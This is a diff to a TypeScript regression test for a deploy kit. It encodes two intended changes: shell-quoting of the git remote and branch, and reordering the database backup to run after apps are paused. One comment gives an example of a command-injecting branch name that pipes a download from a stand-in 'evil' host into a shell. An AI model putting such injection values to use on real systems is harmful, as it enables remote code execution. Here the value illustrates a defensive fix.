@@ -87,6 +87,43 @@ function makeUniversalRuntime(appNames: string[]) {
 
 const ctx = (runtime: unknown) => ({ runtime, sleep: () => {} });
 
+// PKG-82 deliberately changed legacy (non-`layout: releases`) deploy behavior in two
+// ways. This function encodes exactly those two deltas, narrowly and anchored, so
+// they can be applied to the v0.9.4 sequence and diffed against the CURRENT kit's
+// output. Anything the current kit does that ISN'T one of these two deltas will
+// still show up as a mismatch — that's the whole point of keeping the v0.9.4 anchor
+// instead of just re-snapshotting today's output.
+function applyPkg82Deltas(oldSeq: string[]): string[] {
+  // Delta 1 (security): the remote/branch used to be interpolated unquoted into a
+  // remote shell command (`git fetch origin --prune`, `git pull --ff-only origin
+  // master`). The branch is derived from the target's own `origin/HEAD`, so a
+  // branch named e.g. `master;curl evil|sh` would execute on the target. PKG-82
+  // shell-quotes both tokens. Anchored to the exact literal `git fetch`/`git pull
+  // --ff-only` command shapes emitted by this kit — it will not touch any other
+  // command in the sequence.
+  let seq = oldSeq.map((cmd) => {
+    let next = cmd.replace(/git fetch (\S+) --prune\b/, "git fetch '$1' --prune");
+    next = next.replace(/git pull --ff-only (\S+) (\S+)\b/, "git pull --ff-only '$1' '$2'");
+    return next;
+  });
+
+  // Delta 2 (data integrity): the pre-migration DB backup used to run BEFORE
+  // DB-bound apps were paused; a backup taken with writers still live can be
+  // inconsistent. PKG-82 moves the backup to run AFTER the pause step, matching
+  // what the release layout already did. In v0.9.4's legacy sequence the backup
+  // command is always the single line immediately preceding the `pm2 stop ...`
+  // pause line (when dbBoundApps is non-empty); PKG-82 swaps just that one
+  // adjacent pair. Configs with no dbBoundApps (e.g. clipd) have no pause line at
+  // all, so this is a no-op for them.
+  const pauseIndex = seq.findIndex((cmd) => /pm2 stop \S/.test(cmd));
+  if (pauseIndex > 0) {
+    const swapped = [...seq];
+    [swapped[pauseIndex - 1], swapped[pauseIndex]] = [swapped[pauseIndex], swapped[pauseIndex - 1]];
+    seq = swapped;
+  }
+  return seq;
+}
+
 // --- The 7 real consumer configs, embedded verbatim. ---
 const CONFIGS: Record<string, unknown> = {
   bewks: {
@@ -216,7 +253,7 @@ describe('consumer regression: v0.9.4 command sequence is byte-identical (preRes
       const oldRun = run(oldDeploy.deploy, config, appNames);
       const newRun = run(kit.deploy, config, appNames);
 
-      expect(newRun.calls).toEqual(oldRun.calls);
+      expect(newRun.calls).toEqual(applyPkg82Deltas(oldRun.calls));
       expect(newRun.error).toEqual(oldRun.error);
     });
   }
